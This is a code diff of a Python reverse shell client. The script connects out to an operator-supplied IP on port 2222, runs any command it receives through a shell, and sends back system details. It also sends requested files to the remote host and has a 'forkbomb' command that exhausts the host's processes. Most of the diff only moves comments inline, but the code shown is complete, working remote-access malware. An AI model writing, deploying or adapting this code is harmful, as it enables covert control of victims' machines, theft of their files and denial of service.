@@ -8,36 +8,25 @@ from colorama import Fore, Style
 from time import sleep
 
 colorama.init()
-
-RHOST = "127.0.0.1"
+RHOST = input("Provide the remote IP Address: ")
 RPORT = 2222
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((RHOST, RPORT))
-
 while True:
     try:
         header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
         sock.send(header.encode())
         STDOUT, STDERR = None, None
         cmd = sock.recv(1024).decode("utf-8")
-
-        # List files in the dir
-        if cmd == "list":
+        if cmd == "list":  # List files in the dir
             sock.send(str(os.listdir(".")).encode())
-
-        # Forkbomb
-        if cmd == "forkbomb":
+        if cmd == "forkbomb":  # Forkbomb
             while True:
                 os.fork()
-
-        # Change directory
-        elif cmd.split(" ")[0] == "cd":
+        elif cmd.split(" ")[0] == "cd":  # Change directory
             os.chdir(cmd.split(" ")[1])
             sock.send("Changed directory to {}".format(os.getcwd()).encode())
-
-        # Get system info
-        elif cmd == "sysinfo":
+        elif cmd == "sysinfo":  # Get system info
             sysinfo = f"""
 Operating System: {platform.system()}
 Computer Name: {platform.node()}
@@ -46,9 +35,7 @@ Release Version: {platform.release()}
 Processor Architecture: {platform.processor()}
             """
             sock.send(sysinfo.encode())
-
-        # Download files
-        elif cmd.split(" ")[0] == "download":
+        elif cmd.split(" ")[0] == "download":  # Download files
             with open(cmd.split(" ")[1], "rb") as f:
                 file_data = f.read(1024)
                 while file_data:
@@ -58,23 +45,17 @@ Processor Architecture: {platform.processor()}
                 sleep(2)
                 sock.send(b"DONE")
             print("Finished sending data")
-
-        # Terminate the connection
-        elif cmd == "exit":
+        elif cmd == "exit":  # Terminate the connection
             sock.send(b"exit")
             break
-
-        # Run any other command
-        else:
+        else:  # Run any other command
             comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             STDOUT, STDERR = comm.communicate()
             if not STDOUT:
                 sock.send(STDERR)
             else:
                 sock.send(STDOUT)
-
-        # If the connection terminates
-        if not cmd:
+        if not cmd:  # If the connection terminates
             print("Connection dropped")
             break
     except Exception as e:
